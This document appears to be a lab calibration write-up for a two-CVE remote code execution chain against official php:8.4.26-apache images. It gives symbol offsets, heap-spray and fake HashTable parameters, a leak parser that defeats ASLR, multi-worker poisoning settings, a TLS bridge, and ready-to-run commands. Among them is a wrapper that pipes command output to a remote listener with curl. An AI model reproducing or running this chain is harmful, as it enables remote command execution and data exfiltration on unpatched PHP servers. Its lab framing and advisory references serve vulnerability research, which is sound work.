# Calibration — official `php:8.4.26-apache`

Everything here was measured on the lab target, not copied from a write-up.
The only build-specific constants the tool requires are the two symbol
offsets; the heap bases are resolved from the B1 cookie on every command.

**Advisory boundary.** PHP fixed both CVEs in **8.2.35, 8.3.36, 8.4.27, and
8.5.12**. The CVE records give the affected branches as
`8.2.* < 8.2.35`, `8.3.* < 8.3.36`, `8.4.* < 8.4.27`, and
`8.5.* < 8.5.12`. This calibration is for 8.4.26, the last vulnerable 8.4
release; 8.4.27 is the first fixed release. Patched builds are boundary
controls, not targets; this lab does not run them, so no experimental
patch-boundary result is claimed.
Sources: [PHP advisory](https://www.php.net/archive/2026.php#2026-10-21-5),
[GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w),
[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
[CVE-2026-109618](https://www.cve.org/CVERecord?id=CVE-2026-109618),
[CVE-2026-109619](https://www.cve.org/CVERecord?id=CVE-2026-109619).

## 1. Build and offsets

| Item | Value |
|---|---|
| Image | `php:8.4.26-apache`, ID `sha256:60111400ff77…` |
| OS | Debian 13 trixie |
| Apache | 2.4.69 (Debian), prefork |
| PHP | 8.4.26 NTS, 64-bit, mod_php |
| `libphp.so` SHA-256 | `51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c` |
| `zif_system` | `libphp + 0x465370` |
| `zval_ptr_dtor` | `libphp + 0x65eb60` |

Verified with `payloads/../docker/offsets.py` against the container's
`/usr/lib/apache2/modules/libphp.so`:

```
zif_system     0x465370
zval_ptr_dtor  0x65eb60
```

Stock `php.ini-production` is used unchanged:

```
display_errors => Off
display_startup_errors => Off
memory_limit => 128M
post_max_size => 8M
output_buffering => 0
session.sid_length => 32
session.use_strict_mode => Off
session.save_path => no value
max_file_uploads => 20
max_input_vars => 1000
max_multipart_body_parts => -1
```

## 2. Stage parameters

The four requests are the 128M / `display_errors=Off` pure chain:

| Stage | Builder / sender | Parameters |
|---|---|---|
| A1 | `mk_a1.py` + `chunked_send.py` | `--big 78`; chunked transfer; path `index.php` + `Q` |
| B1 | `mk_leak_b.py` + `chunked_send.py` | `--spec LEAK_SPEC --fake-len 0xC8000 --tag`; chunked; path `index.php` |
| A2 | `cheap_oom_a.py` | `--parts 880 --depth 64 --fillers 115`; Content-Length |
| B2 | `fake_ref_b.py` | `--vl 384 --n1 500 --n2 495 --rc 1 --ht-addr S --ht-file ht` |

`LEAK_SPEC` is:

```
G:511:0x137 ×14, G:400:0x137, G:511:0x137, X:900
```

The A1 request uses the query suffix `Q`:

```
?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v
```

A1/B1 must use chunked transfer because they are larger than the stock 8M
`post_max_size`; A2/B2 are below it.

## 3. Fake HashTable carrier

`mk_ht.py` builds one 384-byte `ht` value:

| Offset | Field |
|---|---|
| `+0x00` | `gc: rc=1, IS_ARRAY` |
| `+0x08` | `flags=0x10`, `nTableMask=0xFFFFFFF8` |
| `+0x10` | `arData = S + 0x20` |
| `+0x18` | `nNumUsed=1`, `nNumOfElements=1` |
| `+0x20` | fake `execute_data` (`opline`, `call`, `return_value=zif`, `num_args=1`, `arg1`) |
| `+0x30` | `pDestructor = zif_system` |
| `+0x80` | fake `zend_string` (`rc=1`, `IS_STRING`, `len=len(cmd)`) |
| `+0x98` | command bytes + NUL |

The command limit is `0x160 - 0x98 = 0xC8 = 200` bytes. The tool's output
wrapper consumes part of that budget (see §5).

`fake_ref_b.py` sprays 32-byte fake references every 32 bytes starting at
`ref_start=8`:

```
+0x00 rc (4)          = 1
+0x04 type (1)        = 0x0A  (IS_REFERENCE)
+0x08 ptr (8)         = S
+0x10 val.type (4)    = 0x0107
```

The B request's first spray (`n1=500`) and second spray (`n2=495`) keep the
temporary 384-byte buffer stable while the fake array is installed.

## 4. Leak parsing and address derivation

B1 returns a `Set-Cookie: PHPSESSID=` value that URL-decodes to 819208 bytes
of live heap. The parser:

1. URL-decodes the cookie value.
2. Reads little-endian 64-bit words at 8-byte alignment.
3. Keeps only `0x7f0000000000 <= q <= 0x7fffffffffff` (the 48-bit user-space
   range used by this build).
4. Takes the most common pointer as `zval_ptr_dtor`.
5. Computes `libphp = zdtor - 0x65eb60`.
6. Buckets pointers by `q & ~0x1fffff` (2 MiB).
7. Excludes the libphp bucket and the dominant id bucket.
8. Ranks the remaining buckets by `abs(count - 87)`; the first is the Zend MM
   main chunk, the second is usually the alternate 79-count bucket.
9. `S = main + 0xf8398`, `zif_system = libphp + 0x465370`.

Observed buckets on the official target:

```
0x7f7ef0400000  7495   (session id / request data)
0x7f7ef2c00000  1095   (libphp)
0x7f7ef0a00000    87   (main chunk)
0x7f7ef0200000    79   (alternate)
```

The 0x1a00000..0x1f00000 delta between libphp and the main chunk is a useful
sanity check; the tool does not reject a leak on it because the candidate
selection already excludes the libphp/id buckets.

### Parser pitfall (fixed)

The first version used `0x7fffffffffffffff` as the upper bound. That includes
the `0x41…` filler words, so the most common "pointer" became
`0x4141414141414141` and every candidate failed. The correct bound is the
48-bit `0x7fffffffffff`, as used by the reference parser. Evidence:
`evidence/debug_first_try_parse_range_bug.log`.

## 5. Output wrapper

For `exec`, the tool sends:

```
rm -f /out/oXXXXXXXX; (CMD) > /out/oXXXXXXXX 2>&1
```

`oXXXXXXXX` is an 8-hex unique suffix. The wrapper is 46 bytes, so the
maximum `exec` command is 154 bytes. `raw` skips the wrapper and allows up to
200 bytes, but provides no output channel.

The target's `/out` is the host bind mount `./out`. The tool polls the host
path for up to 4 seconds after B2. The target command's stdout and stderr are
both captured.

For `--oob URL`, the wrapper is:

```
(CMD) > /tmp/.p2s 2>&1; curl -s --data-binary @/tmp/.p2s URL
```

The wrapper is about 72 bytes plus the URL, so the command budget is
`200 - 72 - len(URL)`. The tool does not poll `/out` in this mode; the output
arrives at the callback listener. `--raw` still skips both wrappers and
provides no output channel.

## 6. Multi-worker scheduling

The official target runs one prefork child, so A1/B1 and A2/B2 naturally
share a process. The multi variant uses the same bodies, ini, image and
offsets; only the scheduling changes.

A1 and A2 always end with `HTTP/1.0 500` and `Connection: close`. Keep-alive
cannot pin A1→B1 or A2→B2, and HTTP pipelining A2+B2 is discarded by the
child. The chain therefore poisons the pool:

| Stage | Default | Purpose |
|---|---|---|
| A1 wave | `--a1-workers 4` × `--a1-waves 1` | leave the stale `PS(id)` in every child |
| B1 | `--b1-retries 3` | leak from any poisoned child; a normal cookie or EOF is a miss |
| A2 wave | `--a2-workers 8` × `--a2-waves 2` | leave the dangling `PS(http_session_vars)`; the second wave covers OOM replacements |
| B2 | `--b2-retries 3` per main candidate | execute in any A2-poisoned child; the proof file decides success |

The lab pool is hard-capped so it cannot grow past the A1 wave:

```
StartServers      4
MinSpareServers   2
MaxSpareServers   4
MaxRequestWorkers 4
ServerLimit       4
```

With a larger `MaxRequestWorkers`, prefork spawns a spare during the A1/A2
OOM churn; B1 or B2 then lands on a child that was never poisoned. The
observed failure and the fix are in `experiments/ERROR_LEDGER.md` (E-04,
E-05, E-06, E-10).

PID evidence from the bounded four-worker run
(`evidence/multi/access_pids_fixed4.log`):

```
03:30:38-39  A1 x4   pid=49,50,51   (one transport error)
03:31:40     B1      pid=50 200     (leak)
03:31:41     A2 x16  pid=50,51,52
03:31:42     B2      pid=50/51/52   (proof written; child closed)
```

The fixed-pool leak used in that run:

```
zval_ptr_dtor=0x7f53f7aa2b60 -> libphp=0x7f53f7444000
main=0x7f53f5800000
S=0x7f53f58f8398
zif_system=0x7f53f78a9370
```

B1 failure modes are scheduling misses, not chain failures:

- `RuntimeError('no heap pointers in leak window')`: a normal 50-byte session
  cookie, i.e. an unpoisoned child;
- `EOFError('closed before response headers')`: an unpoisoned child that
  closed instead of returning the normal cookie.

A successful B2 usually returns `EOF` or 500 as well; the proof file is the
only reliable success signal. `--multi` is not for the single-worker target:
four A1s on one child overwrite the same stale state instead of poisoning
four children.

## 7. Runtime address examples

Generation A (container started once; all tool runs before restart):

```
decoded=819208
zval_ptr_dtor=0x7f7ef2d1fb60
libphp=0x7f7ef26c1000
zif_system=0x7f7ef2b26370
main=0x7f7ef0a00000
S=0x7f7ef0af8398
```

Generation B (`--restart auto`; fresh ASLR):

```
zval_ptr_dtor=0x7f5868e12b60
libphp=0x7f58687b4000
zif_system=0x7f5868c19370
main=0x7f5866c00000
S=0x7f5866cf8398
```

Addresses are inherited from the prefork master, so they stay stable across
child respawns while the master lives. A container restart changes them; the
chain re-leaks and works again (11/11 commands after the parser fix).

## 8. Recalibration for another build

1. Read the offsets from the target's `libphp.so`:

   ```bash
   docker create --name tmp php:8.5.11-apache
   docker cp tmp:/usr/lib/apache2/modules/libphp.so /tmp/opencode/libphp.so
   # optional reference helper; clone 9bie/php2shell-bypass-aslr-exp as
   # ../exploits/9bie-latest, or use readelf -Ws / nm -D directly
   python3 ../exploits/9bie-latest/docker/offsets.py tmp /tmp/opencode/offsets.env
   ```

   or use `readelf -Ws` / `nm -D` and find `zif_system` /
   `zval_ptr_dtor`.

2. Run:

   ```bash
   python3 pure_shell.py --zif 0x... --dtor 0x... --leak
   ```

3. If the leak reaches the candidate stage but B2 does not produce a proof,
   recalibrate the heap shape. The knobs are in `payloads/`:

   - `mk_a1.py --big`
   - `mk_leak_b.py --spec`, `--fake-len`
   - `cheap_oom_a.py --parts`, `--depth`, `--fillers`
   - `fake_ref_b.py --vl`, `--n1`, `--n2`, `--ref-start`, `--ref-step`
   - `FAKE_ARRAY_DELTA` and `MAIN_BUCKET_COUNT` in `pure_shell.py`

4. Patched builds (`8.2.35`, `8.3.36`, `8.4.27`, `8.5.12` and later) are
   outside the advisory-defined vulnerable range and are boundary controls,
   not targets. The advisory and CVE records define those fixed releases:
   [PHP advisory](https://www.php.net/archive/2026.php#2026-10-21-5),
   [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w),
   [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
   [CVE-2026-109618](https://www.cve.org/CVERecord?id=CVE-2026-109618),
   [CVE-2026-109619](https://www.cve.org/CVERecord?id=CVE-2026-109619).
   The patch closes the stale-decoder path, but this lab does not run
   patched builds. Treat the fixed releases as the advisory boundary only;
   do not record an experimental patch-boundary proof.

The public `dinosn` 8.5.11 9bie-class port is a different carrier and
prerequisite set (`display_errors=On`, `memory_limit` 16M/32M, a 24 MiB
field, single worker, offsets `zif_system 0x5996e0`,
`zval_ptr_dtor 0x7b47a0`). It is not interchangeable with these stock-ini
parameters; the version matrix needs its own calibration.

## 9. TLS and out-of-band delivery

### 9.1 Out-of-band output

`--oob URL` changes only the command wrapper. The target runs:

```
(CMD) > /tmp/.p2s 2>&1; curl -s --data-binary @/tmp/.p2s URL
```

The stock `php:8.4.26-apache` image has `/usr/bin/curl` and `bash`. The
listener can be the lab helper `experiments/run_oob_listener.sh`, which
starts a second `php:8.4.26-apache` container on the default Docker bridge
and captures the POST body to `oob-out/oob.txt`. The target reaches the
listener at the listener container's bridge IP; no host port forwarding or
`host.docker.internal` assumptions are needed.

The tool returns after B2 with `oob` set and does not read `/out`. Success is
the capture at the listener, not the B2 HTTP status (which is often `EOF`).

Validated:

| Target | Command | Capture | Source |
|---|---|---|---|
| single-worker 8.4.26 | `--oob http://172.17.0.4:18999/ --exec 'id'` | `evidence/oob_id.txt` | `172.17.0.2` |
| multi-worker 4-pool | `--multi --oob ... --exec 'id'` | `evidence/multi/oob_multi_id.txt` | `172.17.0.3` |

The capture is `uid=33(www-data) gid=33(www-data) groups=33(www-data)` in
both cases.

### 9.2 TLS bridge

`--https` does not modify the payloads. The tool starts a loopback
plain-TCP listener on `127.0.0.1:<ephemeral>`, points every sender at it, and
for each connection:

1. opens a TCP connection to the real target;
2. wraps it with TLS (`--insecure` disables verification; `--sni` sets SNI);
3. reads the request headers, rewrites `Host` to the SNI or real host, and
   forwards the headers plus any already-read body bytes;
4. pumps both directions until close.

This preserves chunked request bodies and the 1.68 MB B1 response. The bridge
starts before `run_chain`/`do_leak` and closes after the command.

Validated transport:

```
TLS bridge 127.0.0.1:34427 -> 127.0.0.1:18444
A1/B1 decoded=819208
zval_ptr_dtor=0x7f16420c6b60 -> libphp=0x7f1641a68000
main=0x7f163fe00000 S=0x7f163fef8398 zif_system=0x7f1641ecd370
B2 + OOB -> uid=33(www-data)
```

`experiments/tls_tcp_forward.py` is a raw TCP-level TLS terminator: it
accepts TLS on `127.0.0.1:18444` and forwards the decrypted byte stream to
the plain target on `127.0.0.1:18110`. It does not parse or buffer HTTP, so
the chain sees exactly the plain-HTTP behavior. The full-chain command is:

```
python3 experiments/tls_tcp_forward.py \
  --cert docker/tls/cert.pem --key docker/tls/key.pem \
  --port 18444 --target-port 18110
python3 pure_shell.py --port 18444 --https --insecure \
  --oob 'http://<listener-ip>:18999/' --exec 'id'
```

### 9.3 HTTP reverse proxy caveat

An nginx TLS reverse proxy (`docker/nginx-tls.conf`) also terminates TLS and
forwards to the target, but the B1 response is ~1.68 MB and its `Set-Cookie`
header exceeds nginx's default 4–8 KB header buffer. The proxy returns 502:

```
upstream sent too big header while reading response header from upstream
```

Raising `proxy_buffer_size 4m` / `proxy_buffers 8 4m` makes the TLS **leak**
succeed (`evidence/tool_tls_leak.log`). The full chain through the HTTP proxy
is not stable in this lab: the target's child lifecycle changes and the A1/B1
to A2/B2 handoff often lands on a respawned child. Treat the HTTP proxy as a
leak-capable deployment variant, and mod_ssl or a TCP-level terminator as the
supported full-chain TLS path.

### 9.4 Address stability

The TLS bridge and OOB listener do not change the address derivation. The B1
leak still yields the same buckets; the offsets and the `FAKE_ARRAY_DELTA` are
unchanged. The only new failure mode is transport-level (TLS handshake,
proxy header limits, callback reachability), not heap geometry.
